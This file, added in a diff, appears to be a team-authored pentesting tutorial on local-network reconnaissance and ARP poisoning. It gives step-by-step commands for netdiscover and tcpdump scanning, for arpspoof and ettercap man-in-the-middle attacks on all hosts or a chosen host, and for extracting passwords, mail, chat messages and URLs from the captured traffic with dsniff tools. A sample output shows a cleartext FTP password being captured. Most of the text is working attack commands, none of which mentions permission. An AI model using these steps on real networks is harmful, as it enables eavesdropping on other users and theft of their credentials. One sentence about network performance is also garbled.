@@ -1,0 +1,166 @@
+---------------------------------------
+| Team ph0x90bic proudly presents     |
+| Pentesting in Local Networks Part 1 |
+| Reconaissance and ARP Poisoning     |
+---------------------------------------
+
+INTRODUCTION
+
+This paper describes standard Reconaissance, ARP-Poisoning and traffic
+analysis technics with dsniff, ettercap and netdiscover on local networks.
+You find all needed tools preinstalled on nodezero linux.
+
+Tools needed:
+
+* netdiscover		(Search for hosts on local network)
+* tcpdump/tshark	(Sniff network traffic)
+* dsniff/ettercap	(Launch ARP-Poisoning and analyze pcap files)
+
+---
+
+CHECK LOCAL NETWORK CONFIGURATION
+
+First check your local network configuration to gain information about
+the local network you are connected.
+
+# sudo ifconfig
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:18308 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:18308 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:9599453 (9.5 MB)  TX bytes:9599453 (9.5 MB)
+
+wlan0     Link encap:Ethernet  HWaddr 90:4c:e5:a5:9c:2b  
+          inet addr:10.0.0.1  Bcast:10.0.0.255  Mask:255.255.255.0
+          inet6 addr: fe80::924c:e5ff:fea5:9c2b/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:32320 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:30280 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:21141126 (21.1 MB)  TX bytes:16626291 (16.6 MB)
+
+# sudo route -n
+
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+10.0.0.0        0.0.0.0         255.255.255.0   U     2      0        0 wlan0
+169.254.0.0     0.0.0.0         255.255.0.0     U     1000   0        0 wlan0
+0.0.0.0         10.0.0.254      0.0.0.0         UG    0      0        0 wlan0
+
+RESULTS
+
+Ownipv4:	10.0.0.1
+Ownipv6:	fe80::924c:e5ff:fea5:9c2b/64
+Gateway:	10.0.0.254
+Netmask:	255.255.255.0
+Network:	10.0.0.0/24
+Interface:	wlan0
+
+---
+
+COLLECT PASSIVE INFORMATION
+
+You can collect information without sending network traffic by sniffing
+the network traffic with tshark or tcpdump. Netdiscover lists you the
+alive hosts in realtime and shows you the MAC Vendor.
+
+# sudo tshark -n -i wlan0 -w netlog.pcap not src 10.0.0.1 &
+# sudo tshark -n -i wlan0 not src 10.0.0.1
+
+# sudo tcpdump -n -i wlan0 -w netlog.pcap not src 10.0.0.1 &
+# sudo tcpdump -n -i wlan0 not src 10.0.0.1
+
+# sudo netdiscover -p -i wlan0
+
+--- SNIPPED TCPDUMP OUTPUT START ---
+...
+16:43:46.886878 ARP, Request who-has 10.0.0.254 tell 10.0.0.254, length 28
+16:43:46.888905 ARP, Request who-has 10.0.0.2 tell 10.0.0.254, length 28
+16:43:46.889431 ARP, Request who-has 10.0.0.3 tell 10.0.0.254, length 28
+16:43:46.891183 ARP, Request who-has 10.0.0.4 tell 10.0.0.254, length 28
+...
+--- SNIPPED TCPDUMP OUTPUT END ---
+
+--- NETDISCOVER OUTPUT START ---
+ Currently scanning: (passive)   |   Screen View: Unique Hosts                                                                                                         
+                                                                                                                                                                       
+ 174 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 7344                                                                                                    
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 10.0.0.254      00:1f:9f:e9:1e:a6    157  6594   Thomson Telecom Belgium                                                                                            
+ 10.0.0.3        00:24:21:ba:04:bd    02    120   Unknown vendor                                                                                                       
+ 10.0.0.2        00:18:de:60:9f:7d    02    084   Intel Corporation                                                                                                    
+ 0.0.0.0         00:18:de:60:9f:7d    03    126   Intel Corporation                                                                                          
+ 10.0.0.4        00:90:4b:94:2d:0d    10    420   GemTek Technology Co., Ltd.  
+--- NETDISCOVER OUTPUT END ---
+
+RESULTS
+
+Hosts:		10.0.0.2 (00:18:de:60:9f:7d)
+		10.0.0.3 (00:24:21:ba:04:bd)
+		10.0.0.4 (00:90:4b:94:2d:0d)
+
+---
+
+ARPSPOOFING ALL HOSTS
+
+You can arpspoof all hosts on the local network. This is dangerous in large
+networks, because it increases network performance. But in small networks
+spoofing all hosts is possible without any problems.
+
+# sudo tcpdump -n -i wlan0 -w landump.pcap not host 10.0.0.1
+# sudo tshark -n -i wlan0 -w landump.pcap not host 10.0.0.1
+
+# sudo arpspoof -i wlan0 10.0.0.254
+# sudo ettercap -TQM arp:remote -i wlan0 // /10.0.0.254/
+
+RESULTS
+
+Sniffed traffic from all hosts on network as pcap file in landump.pcap
+
+---
+
+ARPSPOOF SPECIFIC HOST
+
+On larger networks use this attack to arpspoof a specific host only.
+
+# sudo tcpdump -n -i wlan0 -w landump.pcap not host 10.0.0.1
+# sudo tshark -n -i wlan0 -w landump.pcap not host 10.0.0.1
+
+# sudo arpspoof -i wlan0 -t 10.0.0.2 10.0.0.254
+# sudo ettercap -TQM arp:remote -i wlan0 /10.0.0.2/ /10.0.0.254/
+
+RESULTS
+
+Sniffed traffic from 10.0.0.2 only as pcap file in landump.pcap
+
+---
+
+DSNIFF
+
+You can analyze pcap files easily with the dsniff tools or manually with
+string, grep or similar tools.
+
+# sudo dsniff -n -p landump.pcap			(Passwords)
+# sudo urlsnarf -n -p landump.pcap			(HTTP Requests)
+# sudo filesnarf -n -p landump.pcap			(NFS Files)
+# sudo mailsnarf -n -p landump.pcap			(SMTP/POP mails)
+# sudo msgsnarf -n -p landump.pcap			(Chat messages)
+# sudo strings landump.pcap | grep -i 'yourstring'	(Manual analysis)
+
+--- DSNIFF OUTPUT START ---
+03/18/11 20:48:12 tcp 10.0.0.2.50222 -> openbsd.sunsite.ualberta.ca.21 (ftp)
+USER anonymous
+PASS SUPERGEHEIM
+--- DSNIFF OUTPUT END ---
+
+RESULTS
+
+Cleartext information in sniffed pcap traffic.
+
+---
